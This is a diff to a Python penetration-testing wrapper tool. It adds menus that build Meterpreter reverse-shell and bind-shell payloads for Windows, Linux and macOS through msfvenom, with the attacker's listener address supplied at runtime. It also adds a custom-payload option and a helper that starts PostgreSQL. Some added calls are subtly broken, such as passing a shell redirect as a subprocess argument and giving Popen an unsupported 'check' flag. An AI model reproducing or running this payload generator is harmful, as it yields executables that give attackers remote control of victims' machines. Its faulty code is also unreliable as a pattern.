@@ -7,15 +7,135 @@ from scapy.all import *
 import argparse
 import time
 
+def custom_payload():
+    payload_type=input('Enter the type of payload you would like to generate: ')
+    payload_format=input('Enter the format of the payload you would like to generate: ')
+    payload_options=input('Enter the options for the payload you would like to generate: ')
+    payload_output=input('Enter the name of the file you would like to save the payload to: ')
+    print('''
+    msfvenom -p {} {} {} > {}
+    '''.format(payload_type,payload_format,payload_options,payload_output))
+    try:
+        subprocess.run(['msfvenom','-p',payload_type,payload_format,payload_options,'>',payload_output],text=True,check=True)
+    except subprocess.SubprocessError as error:
+        print('Encountered an error: ',str(error))
+
+def bind_shell(os):
+    if os=='windows':
+        lport=input('Enter the port of the listener: ')
+        print('''
+        msfvenom -p windows/meterpreter/bind_tcp LPORT={} -f exe > shell.exe
+        '''.format(lport))
+        try:
+            subprocess.run(['msfvenom','-p','windows/meterpreter/bind_tcp','LPORT={}'.format(lport),'-f','exe','>','shell.exe'],text=True,check=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    elif os=='linux':
+        lport=input('Enter the port of the listener: ')
+        print('''
+        msfvenom -p linux/x86/meterpreter/bind_tcp LPORT={} -f elf > shell.elf
+        '''.format(lport))
+        try:
+            subprocess.run(['msfvenom','-p','linux/x86/meterpreter/bind_tcp','LPORT={}'.format(lport),'-f','elf','>','shell.elf'],text=True,check=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    elif os=='mac':
+        lport=input('Enter the port of the listener: ')
+        print('''
+        msfvenom -p osx/x86/shell_bind_tcp LPORT={} -f macho > shell.macho
+        '''.format(lport))
+        try:
+            subprocess.run(['msfvenom','-p','osx/x86/shell_bind_tcp','LPORT={}'.format(lport),'-f','macho','>','shell.macho'],text=True,check=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    else:
+        print('Invalid option.')
+def reverse_shell(os):
+    if os=='windows':
+        lhost=input('Enter the IP address of the listener: ')
+        lport=input('Enter the port of the listener: ')
+        print('''
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > shell.exe
+        '''.format(lhost,lport))
+        try:
+            subprocess.run(['msfvenom','-p','windows/meterpreter/reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','exe','>','shell.exe'],text=True,check=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    elif os=='linux':
+        lhost=input('Enter the IP address of the listener: ')
+        lport=input('Enter the port of the listener: ')
+        print('''
+        msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf > shell.elf
+        '''.format(lhost,lport))
+        try:
+            subprocess.run(['msfvenom','-p','linux/x86/meterpreter/reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','elf','>','shell.elf'],text=True,check=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    elif os=='mac':
+        lhost=input('Enter the IP address of the listener: ')
+        lport=input('Enter the port of the listener: ')
+        print('''
+        msfvenom -p osx/x86/shell_reverse_tcp LHOST={} LPORT={} -f macho > shell.macho
+        '''.format(lhost,lport))
+        try:
+            subprocess.run(['msfvenom','-p','osx/x86/shell_reverse_tcp','LHOST={}'.format(lhost),'LPORT={}'.format(lport),'-f','macho','>','shell.macho'],text=True,check=True)
+        except subprocess.SubprocessError as error:
+            print('Encountered an error: ',str(error))
+    else:
+        print('Invalid option.')
+
+
+def payload():
+    while True:
+        print('''
+[1] Generate a reverse shell payload (Meterpreter)
+[2] Generate a bind shell payload (Meterpreter)
+[3] Generate a custom payload
+[BACK] Back to main menu             
+          
+''')
+        payloadOption=input('Select an option: ')
+        if payloadOption=='1':
+            payload_os=input('Enter the OS of the target (windows,linux,mac): ')
+            if payload_os=='windows':
+                reverse_shell('windows')
+            elif payload_os=='linux':
+                reverse_shell('linux')
+            elif payload_os=='mac':
+                reverse_shell('mac')
+            else:
+                print('Invalid option.')
+        elif payloadOption=='2':
+            payload_os=input('Enter the OS of the target (windows,linux,mac): ')
+            if payload_os=='windows':
+                bind_shell('windows')
+            elif payload_os=='linux':
+                bind_shell('linux')
+            elif payload_os=='mac':
+                bind_shell('mac')
+            else:
+                print('Invalid option.')
+        elif payloadOption=='3':
+            custom_payload()
+        elif payloadOption=='BACK':
+            main()
+        else:
+            print('Invalid option.')
+def postgresql():
+    try:
+        subprocess.Popen(['sudo','service','postgresql','start'],text=True,check=True)
+        print('PostgreSQL server started.')
+    except subprocess.SubprocessError as error:
+        print('Encountered an error: ',str(error))
 def netcat(host,port,option):
     if option=='tcp':
         try:
-            subprocess.Popen(['sudo','nc',host,port])
+            subprocess.Popen(['sudo','nc',host,port],text=True,check=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
     elif option=='udp':
         try:
-            subprocess.Popen(['sudo','nc','-u',host,port])
+            subprocess.Popen(['sudo','nc','-u',host,port],text=True, check=True)
         except subprocess.SubprocessError as error:
             print('Encountered an error: ',str(error))
 def utilities():
@@ -85,7 +205,6 @@ def socialEngineering():
 [1] Use the Social-Engineering Toolkit
 [2] Use BeEF
 [3] Set up an Apache web server to serve pages
-
 [BACK] Back to main menu
               
 ''')
@@ -639,9 +758,12 @@ _/  |_|  |__   ____ |  |__ _____    ____ |  | _|__| ____    _____/  |_  ____   _
 #        Author & Maintainer:         #
 #                                     #
 #            Shu-Hao Liu              #
-#              v0.2                   #
+#               v0.2                  #
 #######################################
 
+Only use this tool for ethical purposes. The author(s) is not liable for any damage
+caused by the use of this tool.
+      
 Tip: Switch to root before running this tool to get a smoother experience
 
 ''')
